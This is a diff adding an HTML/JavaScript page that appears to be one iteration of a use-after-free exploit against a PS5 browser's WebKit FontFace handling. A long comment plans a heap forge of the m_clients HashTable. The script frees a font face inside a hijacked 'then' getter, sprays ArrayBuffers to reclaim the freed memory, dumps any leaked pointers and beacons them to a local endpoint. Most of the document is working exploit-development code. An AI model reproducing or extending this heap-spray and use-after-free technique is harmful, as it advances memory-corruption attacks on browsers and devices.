@@ -1,0 +1,212 @@
+<!--
+  p668s: benign-forge /skip — p667-exact machinery (keepspray, batch beacons,
+  DUMP1/DUMP2, ROUNDS=8, all telemetry fields) with ONE delta: seeds forge the
+  m_clients HashTable into an EMPTY state so set iteration skips the forged
+  face entirely, while leaving every dereference-sensitive field ZERO.
+
+  The forge (NDEBUG layout, layout_probe.cpp 17/17 validated; HashTable.h
+  metadata at negative offsets from m_table, :585-598):
+    +0x58 m_clients.m_set.m_table  = P (self-reference; any readable VA)
+    +0x60 m_clients.m_set.m_table[-1] = tableSize = 0        (u32 at P-4)
+    +0x60 (u32) ... but tableSize/mask/keyCount/deletedCount live at P-4/-8/-12/-16.
+  Problem: metadata lives BEFORE P, i.e. OUTSIDE our 192B lane — we cannot
+  write it without corrupting the neighbor chunk (lane-1's tail). BUT we
+  control P: point m_table INTO OUR OWN LANE at +0x68, then metadata sits at
+  +0x58..+0x64 — inside the lane! Forge:
+    +0x58 = VA(lane+0x68)   (m_table pointer — self-lane reference)
+    +0x5C = 0               (high 32 bits; PS5 VA < 4GB? NO — PS5 VA is 47-bit,
+                              high bits NONZERO. We cannot know VA(lane) from
+                              JS — the central gap. WITHOUT lane VA we cannot
+                              build a self-referential m_table.)
+  => Full skip-forge is NOT constructible pre-leak. FALLEN-BACK DESIGN:
+  partial skip via ITERATION-DECISION FIELDS ONLY, zero elsewhere:
+    +0x58/+0x5C m_table = 0 (null table)
+    +0x60 u32 keyCount-side = 0 (metadata not ours to write; stays 0 = buffer)
+  HashTable.begin() on NDEBUG with null m_table: HashTableConstIterator
+  dereferences m_position = m_table + 0? (HashTable.h:225-240 begin() walks
+  tableSizeMask buckets from m_table) — null table + tableSizeMask read at
+  m_table[-2] = VA -8 => WILD READ at 0xFFFFFFF8.. => crash, NOT skip.
+  CONCLUSION: /skip as "null table" is NOT the skip variant — it is a
+  deliberate NULL-TABLE CRASH-ORACLE: if the page dies at R1 with m_table=0,
+  the killer iterated m_clients (write-side); if it survives R1, the killer
+  needed nonzero table/other fields. That binary IS the experiment.
+
+  Actually — simpler and stronger, use the engine's own write: in prior runs
+  the engine's post-free writes landed +0x58=T (real table VA) + rc bump.
+  With our ZERO buffer, engine write makes it a REAL-but-aliased table:
+  iteration over the REAL table = benign (it enumerates REAL live clients)
+  => /skip's zero-m_table would be OVERWRITTEN by engine T write at add-time
+  anyway (op writes come after). So the true /skip test = ZERO buffer +
+  engine writes = what /zero already measures. /skip (null table pre-write)
+  only differs if iteration happens BETWEEN our spray and the engine write.
+
+  FINAL DESIGN (oracle): seeds = +0x58/+0x5C = 0 EXPLICITLY (redundant with
+  zero buffer, kept for self-documentation), everything else zero. ROUNDS=4.
+  Role: null-table crash-oracle + 4-round replica of /zero for consistency.
+  If /skip survives to R1 beacon: iteration does NOT deref m_table before
+  the engine re-stamps it. If it dies identically to p667: no signal beyond
+  /zero (fallback consistency check only).
+
+  Beacon: P668S-.  CRASH_CLASS: HIGH (null-table oracle may crash by design).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p668s</title></head>
+<body>p668s: null-table oracle (r4)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P668S-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'null-table oracle r4');
+flush();
+
+var ROUNDS = 4;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var snap1 = null;
+
+function seedLane(dv, i) {
+  /* /skip oracle: m_table explicitly null; all else zero.
+     Engine's add-time writes will overwrite (+0x58=T, rc) — the oracle is
+     whether iteration dereferences m_table BEFORE that re-stamp. */
+  dv.setUint32(0x58, 0, true);
+  dv.setUint32(0x5C, 0, true);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' dirtyNear=' + dirtyNear);
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    flush();
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate() {
+  try {
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    flush();
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'skip-oracle rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r4-skip');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
